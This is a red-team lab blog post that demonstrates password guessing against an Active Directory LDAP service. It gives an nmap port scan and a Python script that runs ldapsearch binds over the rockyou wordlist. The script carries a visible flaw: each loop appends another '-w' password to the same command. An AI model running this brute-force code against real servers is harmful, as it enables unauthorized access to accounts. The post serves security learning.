---
title: Brute Forcing Active Directory LDAP using a Custom Python Script
date: 2025-01-26
draft: false
author: Alex Jenkins
---


# Red Team
## Introduction
In this article we will perform a password guessing attack from the perspective of the adversary. The process begins by using **nmap** to scan the host and determine if the Lightweight Directory Access Protocol (LDAP) port is open. Once the LDAP service has been confirmed, a custom python script will be used to brute force a user's password with **ldapsearch**.

-  what is LDAP bind (related to ldapsearch)
- developing a python script

## Assumptions
For this red team exercise, it is assumed that the adversary has performed the initial reconnaissance stage. During that engagement they would have acquired an Active Directory (AD) username, discovered a domain, and located the host's IP address. The next logical step for the adversary is to identify a network entry point.

## LDAP Discovery
As discussed, the tool used to discover the LDAP port status will be nmap. Efforts have been made to ensure the nmap scan does not create too much noise - only scanning the relevant port and address, and revoking ICMP scans. A full example of the scan used during this engagement, including my specific output, and a description of each command is shown below:


**Input**

```
nmap -sT -Pn -p389 192.168.1.138
```

**Output**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 20:00 GMT
Nmap scan report for 192.168.1.138
Host is up (0.00049s latency).

PORT    STATE SERVICE
389/tcp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

**Description**

| Flag | Description                                                                                                                                                                                               |
| ---- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| sT   | Performs a full three-way TCP handshake, mimicking the normal connection flow of applications and hopefully blending in with legitimate traffic.                                                          |
| Pn   | Based on the assumptions, host discovery is not required and ICMP requests can be deactivated. Ping scans are generally detected and blocked by firewalls so this is generally a good idea in most cases. |
| p389 | Only scan the port of interest. Doing so creates less noise on the host than scanning the top 1,000 most common ports, with the additional benefit of being a faster scan overall.                        |
nmap's output shows that the LDAP port is indeed open on its standard port of 389, which means that it is reachable and we can begin our attack.
## Brute Force
I've decided to use the ldapsearch tool for this attack. This tool is used to open a connection to an LDAP server, bind (or authenticate into the directory server), and perform a search query based on the input. We are interested specifically in **bind** in this case, because a successful authentication will indicate a correctly guessed password.

Let's first go over the ldapsearch command. The following is the exact command I need to use in my environment to login to the scarab user:

``` bash
ldapsearch -H "ldap://192.168.1.138" -D "scarab" -b "DC=backyard,DC=local" -w "abc123"
```

| Flag | Description                                                                                                                                            |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| -H   | Used to specify the LDAP server to connect with. This must be prefixed with ldap://, and followed with an IP address or domain name.                   |
| -D   | The Distinguished Name (DN) of the user aka the username.                                                                                              |
| -w   | The password used to bind. This can be populated using a word-list to automate the process.                                                            |
| -b   | The **base** Domain Name (DN) from which to begin the search. In this case I've chosen the root domain. Omitting this will result in "no such object". |
A successful ldapsearch bind will return directory listings for the given base DN and a return code of 0. This return code is useful because it can be used to determine if a login was successful or not. For example, when a login is unsuccessful with invalid credentials the following output is received: 

```
ldap_bind: Invalid credentials (49)
```

That's great and we can validate the login now, but manually using the ldapsearch command repeatedly to iterate through the rockyou password list is tedious and inefficient. Therefore, I've built it into a Python script. 

```python
import subprocess

password_list = '/usr/share/wordlists/rockyou.txt'
username = 'scarab'
server = '192.168.1.138'

command = ['ldapsearch', 
           '-H', f'ldap://{server}',
           '-D', f'{username}',
           '-b', 'DC=backyard,DC=local',
           ]

with open(password_list) as wordlist:
    
    for password in wordlist:
    
        password = password.strip() # remove whitespace and newlines
        print(f'Trying {password}', end='\r')
        
        command += ['-w', password]
        output = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if output.returncode == 0: # LDAP auth success
            print(f'Matched {password}')
            break
```

Essentially all this python script does is use subprocess to run the ldapsearch tool repeatedly until it finds a password match. It's not super intelligent, if it doesn't find a match it won't tell you - we could modify it to do that but for this exercise this is fine. The script checks for the error code 0 and prints the matched password if the condition is met. The output is suppressed, but can be added back in by modifying the subprocess.run() function if required.

And that's it, within a short space of time the password will be guessed (assuming it exists in the chosen wordlist). The weak password policy and lack of lockout mechanisms make this a trivial exercise, allowing limitless attempts to authenticate into the user despite an array of failed logins.

I hope you enjoyed this example of password guessing and that you found value in the examples and code provided. The purpose of this was to be an introductory exercise using readily available services upon setup of an AD server. This is a very basic example of password guessing, but I feel it has effectively showcased this MITRE technique. This was new to me and I had fun building the python script and learning a little bit about LDAP and how the ldapsearch tool works. 